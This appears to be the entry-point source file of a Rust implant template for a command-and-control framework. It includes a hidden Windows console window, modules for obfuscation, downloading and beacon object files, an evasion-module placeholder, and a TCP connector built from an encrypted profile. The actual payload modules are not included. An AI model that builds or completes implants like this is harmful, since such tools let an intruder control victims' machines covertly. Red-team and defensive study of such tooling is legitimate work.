// __NAME__ Agent — Rust Implant Entry Point
//
// Minimal scaffold. Implement the agent loop and connect it to
// the protocol/crypto modules.

// Hide console window on Windows when debug feature is disabled
#![cfg_attr(all(windows, not(feature = "debug")), windows_subsystem = "windows")]

mod config;
mod crypto;
mod protocol;
mod agent;
mod commander;
mod runtime_common;
mod runtime_fs;
mod runtime_response;
mod connector_tcp;
mod jobs;
mod downloader;
mod bof;
#[macro_use]
mod obf;
// __EVASION_MOD__

fn main() {
    let profile = config::ENC_PROFILES
        .first()
        .map(|bytes| bytes.to_vec())
        .unwrap_or_default();

    let profile_text = String::from_utf8_lossy(&profile);
    let first_line = profile_text.lines().next().unwrap_or_default();
    let connector = connector_tcp::ConnectorTCP::from_profile(first_line);

    let mut agent = agent::Agent::new(profile, Box::new(connector));
    agent.run();
}
